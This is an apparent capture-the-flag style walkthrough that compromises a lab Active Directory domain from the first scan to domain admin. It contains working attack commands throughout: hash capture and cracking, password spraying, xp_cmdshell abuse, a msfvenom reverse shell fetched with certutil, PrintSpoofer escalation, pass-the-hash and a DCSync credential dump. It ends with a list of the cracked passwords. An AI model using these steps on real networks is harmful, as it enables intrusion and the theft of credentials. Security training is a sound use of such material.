We first run an NMAP scan on the network
```bash
nmap -sC -sV 172.16.7.0/24 -oA nmap
```

DC01 - 172.16.7.3
```
PORT     STATE SERVICE       VERSION                                                           
53/tcp   open  domain        Simple DNS Plus                                                   
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-04 10:37:50Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
```

MS01 - 172.16.7.50
```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

SQL01 - 172.16.7.60
```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
```

---

We need to start by getting a foothold in the domain. We need a user/password.
For this we can run responder on the attack host.

```bash
responder -I ens224
```

I let it run and after some time it captures a hash for the user `AB920`. The hash is saved in `/usr/share/responder/logs`. We can try to crack the hash with hashcat. Since it's an NTLM hash we use mode 5600.

```bash
hashcat -m 5600 ab920hash /usr/share/wordlist/rockyou.txt
```
The hash cracks and the cleartext password for `AB920` is `weasal`.

Next we can check what we can do with this user
```bash
sudo crackmapexec winrm 172.16.7.0/24 -u AB920 -p weasal

WINRM       172.16.7.60     5985   NONE             [*] None (name:172.16.7.60) (domain:None)
WINRM       172.16.7.50     5985   NONE             [*] None (name:172.16.7.50) (domain:None)
WINRM       172.16.7.50     5985   NONE             [*] http://172.16.7.50:5985/wsman
WINRM       172.16.7.60     5985   NONE             [*] http://172.16.7.60:5985/wsman
WINRM       172.16.7.3      5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL)
WINRM       172.16.7.3      5985   DC01             [*] http://172.16.7.3:5985/wsman
WINRM       172.16.7.50     5985   NONE             [+] None\AB920:weasal (Pwn3d!)
WINRM       172.16.7.60     5985   NONE             [-] None\AB920:weasal
WINRM       172.16.7.3      5985   DC01             [-] INLANEFREIGHT.LOCAL\AB920:weasal
```

The output shows that with the `AB920` user can we win-rm to 172.16.7.50.
```bash
evil-winrm -u AB920 -p weasal -i 172.16.7.50
```
This gives us the flag `aud1t_gr0up_m3mbersh1ps!`.

Since we have a user we can try to enumerate other users with crackmapexec.
```bash
sudo crackmapexec ldap 172.16.7.3 -u AB920 -p weasal --users > user.list
```

This outputs the users into a file but we need to clean it up.

```bash
cat user.list | awk '{print $5}' > cleanuser.list
```
We now only have the usernames in the list. We can try to password spray these users with a simple standard password.

```bash
sudo crackmapexec smb 172.16.7.3 -u cleanuser.list -p Welcome1
```
The output shows that the username `BR086` uses the password `Welcome1`.

I again try to list all the systems to which I can winrm with the `BR086` users. But this time there are none. Maybe I can access SMB with this account.
```bash
sudo crackmapexec smb 172.16.7.0/24 -u BR086 -p Welcome1
```
The output is success!

When enumerating shares with the `--shares` flag in cme. I can see that `DC01` hosts a Department Shares share. This can be interesting so I decided to download this share.

```bash
sudo crackmapexec smb 172.16.7.3 -u BR086 -p Welcome1 -M spider_plus -o DOWNLOAD_FLAG=True
```

In the Department Share / IT / Private / Development/ web.config file we can find credentials for the `netdb` user. 

Now that we have a user and password for the SQL server we can use impacket-MSSQLclient.py. 

```bash
mssqlclient.py INLANEFREIGHT.LOCAL/netdb:'D@ta_bAse_adm1n!'@172.16.7.60
```

We enable `xp_cmdshell` and check the privileges
```bash
enable_xp_cmdshell
xp_cmdshell whoami /priv
```
It shows that we have the  `SeImpersonatePrivilege` enabled. This means we can use PrintSpoofer for example to elevate our privileges.

I first create a meterpreter payload using msfvenom
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.241 LPORT 4444 -f exe > shell.exe
```
I place this shell on the SQL machine using the certutil to download it together with the printspoofer exploit. 

```powershell
SQL> xp_cmdshell "certutil.exe -urlcache -f http://172.16.7.240/PrintSpoofer.exe c:\users\Public\PrintSpoofer.exe"
SQL> xp_cmdshell "certutil.exe -urlcache -f http://172.16.7.240/shell.exe  c:\users\Public\shell.exe"
```

Then I start a multi/handler in metasploit

```bash
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 10.10.14.241
set lport 4444 
run
```

Now I can execute the shell with the printspoofer exploit to get a elevated shell
```powershell
SQL> xp_cmdshell c:\users\Public\PrintSpoofer.exe -c "c:\users\Public\shell.exe"
```

Now that we have a meterpretrer session I can dump the SAM database with hashdump.

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070
```

Now we have an administrator hash. 

With this administrator hash we can use evil-winrm to get a admin shell on the MS01 machine.

```bash
evil-winrm -u Administrator -H bdaffbfe64f1fc646a3353be1c2c3c99 -i 172.16.7.50
```


The next question asks us to find the user who has GenericAll rights over the Domain Admin group.
To find out who this is we can use bloodhound.

To collect data for bloodhound we use sharphound. I need to use sharphound v1.0.2 because it won't work if I don't use it.
https://github.com/SpecterOps/SharpHound/releases/tag/v1.0.2

I place the SharpHound on MS01 and try to run it. It fails for some reason. I then try to run it from a RDP session. To do this I need to first enable passwordless login (I login with the admin hash). This is easy since I already have an admin shell with winrm.
```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

I then need to add an SSH tunnel for my proxychains
```
ssh -D 9050 htb-student@<attack-box-ip>
```

```bash
proxychains xfreerdp /u:administrator /pth:bdaffbfe64f1fc646a3353be1c2c3c99 /v:172.16.7.50
```

Now the sharphound.exe does work and it gives me a zip file. I move this zipfile to the pwnbox to upload it in bloodhound. (neo4j:neo4j).

Next we can check under the analysis tab, the shortes path to domain admin. It shows that user `CT059` has GenericAll rights over the Domain Admins group. This means that if we control the CT059 user, we can add ourself to that group.

To get the password for this user I use Inveigh.ps1 (responder on Windows) to intercept the NTLM hashes. 

```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -FileOutput Y 
```

It gives me the hash for user `CT059` and after cracking it with hashcat mode 5600 we get the password `charlie1`

On the RPD session on MS01 we can now open a CMD shell with `runas` to get a shell in the context of the `CT059` user to add ourself to the domain admin group

```powershell
runas /netonly /user:CT059 powershell.exe
Net group "Domain Admins" ct059 /add /domain

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.                                                                                                                                                            The command completed successfully.  
```

We now have a user who is in the domain admins group and we can now perfom a dcsync attack with this user.

```bash
secretsdump.py -outputfile 'dcsync.txt' 'INLANEFREIGHT.LOCAL/CT059:charlie1@172.16.7.3'
```

We now have all the user hashes including the krbtgt hash.


```
ab920:weasal
br086:Welcome1
ct059:charlie1
netdb:D@ta_bAse_adm1n!
Administrator:bdaffbfe64f1fc646a3353be1c2c3c99
```